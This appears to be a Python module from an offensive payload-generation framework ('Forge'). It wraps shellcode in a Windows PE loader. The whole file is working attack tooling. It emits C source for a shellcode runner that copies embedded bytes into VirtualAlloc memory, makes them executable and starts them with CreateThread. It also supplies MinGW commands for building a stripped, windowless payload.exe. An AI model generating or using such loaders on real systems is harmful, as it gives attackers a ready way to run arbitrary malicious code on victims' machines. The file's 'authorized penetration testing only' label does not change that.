"""PE/EXE Format Builder.

Wraps shellcode (or encoded C source) in a Windows PE loader.

If the shellcode is already C source (from the shellcode templates),
returns it directly with a compile note.

If the shellcode is raw bytes, generates a C VirtualAlloc loader that
embeds the bytes as a static array.

Compile commands:
  x64: x86_64-w64-mingw32-gcc -o out.exe loader.c -lws2_32 -s -O2 -mwindows
  x86: i686-w64-mingw32-gcc   -o out.exe loader.c -lws2_32 -s -O2 -m32 -mwindows

FOR AUTHORIZED PENETRATION TESTING ONLY.
"""
from __future__ import annotations

import textwrap


class PeFormat:
    """Windows PE EXE format builder."""

    def __init__(self, arch: str = "x64"):
        if arch not in ("x86", "x64"):
            raise ValueError(f"PE format supports x86/x64, got {arch!r}")
        self.arch = arch

    def build(self, shellcode: bytes) -> bytes:
        """Wrap shellcode in a PE loader.

        If shellcode is text (C source from templates), embed it verbatim.
        If shellcode is binary bytes, wrap in a static-array loader.
        """
        if self._is_c_source(shellcode):
            # Already a complete C source file — annotate and return
            header = f"/* Forge PE Loader ({self.arch}) — compile with MinGW */\n"
            return (header + shellcode.decode(errors="replace")).encode()

        # Binary shellcode → embed in a VirtualAlloc loader
        return self._binary_loader(shellcode).encode()

    def _is_c_source(self, data: bytes) -> bool:
        """Detect if data is C source text (starts with comment or #include)."""
        try:
            head = data[:128].decode("utf-8", errors="strict").lstrip()
            return head.startswith("/*") or head.startswith("#")
        except UnicodeDecodeError:
            return False

    def _binary_loader(self, sc: bytes) -> str:
        """Generate C VirtualAlloc/memcpy/CreateThread loader for raw shellcode."""
        sc_hex = ", ".join(f"0x{b:02x}" for b in sc)
        sz     = len(sc)
        arch_note = "x86_64-w64-mingw32" if self.arch == "x64" else "i686-w64-mingw32"
        m32_flag  = "" if self.arch == "x64" else " -m32"

        return textwrap.dedent(f"""\
        /*
         * Forge PE Loader ({self.arch}) — shellcode runner
         * Compile: {arch_note}-gcc -o payload.exe loader.c -lws2_32 -s -O2{m32_flag} -mwindows
         *
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #define WIN32_LEAN_AND_MEAN
        #include <windows.h>
        #include <string.h>

        static unsigned char _sc[] = {{ {sc_hex} }};
        #define SC_SIZE {sz}

        int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {{
            (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

            LPVOID exec = VirtualAlloc(NULL, SC_SIZE,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!exec) return 1;

            memcpy(exec, _sc, SC_SIZE);

            DWORD old = 0;
            if (!VirtualProtect(exec, SC_SIZE, PAGE_EXECUTE_READ, &old)) return 1;

            HANDLE ht = CreateThread(NULL, 0,
                                     (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
            if (!ht) return 1;

            WaitForSingleObject(ht, INFINITE);
            CloseHandle(ht);
            VirtualFree(exec, 0, MEM_RELEASE);
            return 0;
        }}
        """)
